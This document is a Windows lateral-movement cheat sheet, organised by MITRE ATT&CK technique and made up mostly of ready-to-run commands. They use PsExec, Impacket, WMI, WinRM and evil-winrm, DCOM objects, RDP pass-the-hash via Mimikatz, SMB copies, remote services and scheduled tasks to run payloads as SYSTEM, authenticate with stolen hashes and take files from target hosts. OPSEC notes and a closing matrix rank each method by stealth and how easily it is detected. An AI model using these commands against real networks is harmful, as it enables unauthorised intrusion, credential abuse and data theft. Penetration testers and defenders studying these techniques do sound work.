# Windows Lateral Movement Reference

Techniques for moving between systems in a Windows domain environment.

**MITRE ATT&CK**: T1021, T1047, T1053, T1569

## PsExec (T1021.002 / T1569.002)

### Sysinternals PsExec

```cmd
:: Interactive shell
PsExec.exe \\target -u domain\admin -p Password1 cmd.exe

:: Run as SYSTEM
PsExec.exe \\target -u domain\admin -p Password1 -s cmd.exe

:: Execute command
PsExec.exe \\target -u domain\admin -p Password1 -d -c payload.exe

:: Copy and execute local binary
PsExec.exe \\target -u domain\admin -p Password1 -c -f C:\temp\payload.exe
```

### Impacket psexec.py

```bash
# Password auth
psexec.py domain/admin:'Password1'@target

# Pass-the-hash
psexec.py -hashes :NTLM_HASH domain/admin@target

# Kerberos
psexec.py -k -no-pass domain/admin@target
```

**OPSEC**: Creates a service (PSEXESVC), writes to ADMIN$ share, generates Event ID 7045. Noisy — use alternatives when stealth matters.

## WMI (T1047)

### wmic

```cmd
:: Execute command
wmic /node:target /user:domain\admin /password:Password1 process call create "cmd.exe /c whoami > C:\temp\out.txt"

:: List processes
wmic /node:target /user:domain\admin /password:Password1 process list brief
```

### PowerShell CIM/WMI

```powershell
$cred = Get-Credential
$session = New-CimSession -ComputerName target -Credential $cred

# Execute command
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami > C:\temp\out.txt"}

# Query system info
Get-CimInstance -CimSession $session -ClassName Win32_OperatingSystem
```

### Impacket wmiexec.py

```bash
wmiexec.py domain/admin:'Password1'@target
wmiexec.py -hashes :NTLM_HASH domain/admin@target
```

**OPSEC**: No service created, no binary on disk. Uses DCOM (TCP 135 + dynamic). Stealthier than PsExec.

## WinRM (T1021.006)

### PowerShell Remoting

```powershell
$cred = Get-Credential

# Interactive session
Enter-PSSession -ComputerName target -Credential $cred

# Execute command
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami; hostname }

# Execute on multiple hosts
Invoke-Command -ComputerName host1,host2,host3 -Credential $cred -ScriptBlock { whoami }

# Copy file via PSSession
$s = New-PSSession -ComputerName target -Credential $cred
Copy-Item -Path C:\temp\payload.exe -Destination C:\temp\payload.exe -ToSession $s
```

### evil-winrm

```bash
# Password auth
evil-winrm -i target -u admin -p 'Password1'

# Pass-the-hash
evil-winrm -i target -u admin -H NTLM_HASH

# With SSL
evil-winrm -i target -u admin -p 'Password1' -S

# Upload/download files
*Evil-WinRM* PS> upload payload.exe C:\temp\payload.exe
*Evil-WinRM* PS> download C:\temp\secret.txt
```

**OPSEC**: Uses HTTP/HTTPS (5985/5986). Encrypted. Less artifacts than PsExec. Requires WinRM enabled on target.

## DCOM (T1021.003)

### MMC20.Application

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

### ShellWindows

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

**OPSEC**: Uses DCOM (TCP 135 + dynamic). No service, no binary. Very stealthy but limited to command execution.

## RDP (T1021.001)

```cmd
:: Standard RDP
mstsc /v:target

:: With credentials (cmdkey)
cmdkey /generic:target /user:domain\admin /pass:Password1
mstsc /v:target

:: xfreerdp (Linux)
xfreerdp /v:target /u:admin /p:Password1 /d:domain /dynamic-resolution

:: Pass-the-hash RDP (restricted admin mode)
sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:"mstsc /restrictedadmin"

:: SharpRDP (command execution via RDP, no GUI)
SharpRDP.exe computername=target command="cmd /c whoami" username=domain\admin password=Password1
```

## SMB File Transfer

```cmd
:: Upload via admin share
copy payload.exe \\target\C$\temp\payload.exe

:: net use with credentials
net use \\target\C$ /user:domain\admin Password1
copy payload.exe \\target\C$\temp\
net use \\target\C$ /delete

:: Download
copy \\target\C$\temp\secret.txt C:\temp\
```

```bash
# Impacket smbclient
smbclient.py domain/admin:'Password1'@target
# shares
# use C$
# put payload.exe
```

## Service Control Manager (T1569.002)

```cmd
:: Create and start remote service
sc \\target create payload binpath= "C:\temp\payload.exe" start= auto
sc \\target start payload
sc \\target delete payload
```

## Scheduled Tasks (Remote) (T1053.005)

```cmd
schtasks /Create /S target /U domain\admin /P Password1 /TN "update" /TR "C:\temp\payload.exe" /SC ONCE /ST 00:00 /RU SYSTEM
schtasks /Run /S target /U domain\admin /P Password1 /TN "update"
schtasks /Delete /S target /U domain\admin /P Password1 /TN "update" /F
```

```bash
# Impacket atexec
atexec.py domain/admin:'Password1'@target "whoami"
```

## Decision Matrix

| Technique | Stealth | Prerequisites | Interactive? |
|-----------|---------|--------------|:---:|
| **WMI** | High | Admin creds, TCP 135 | No |
| **DCOM** | High | Admin creds, TCP 135 | No |
| **WinRM** | Medium | WinRM enabled, TCP 5985/5986 | Yes |
| **PsExec** | Low | Admin creds, SMB (445) | Yes |
| **RDP** | Low | RDP enabled, TCP 3389 | Yes |
| **SCM** | Medium | Admin creds, SMB (445) | No |
| **Schtasks** | Medium | Admin creds, RPC | No |
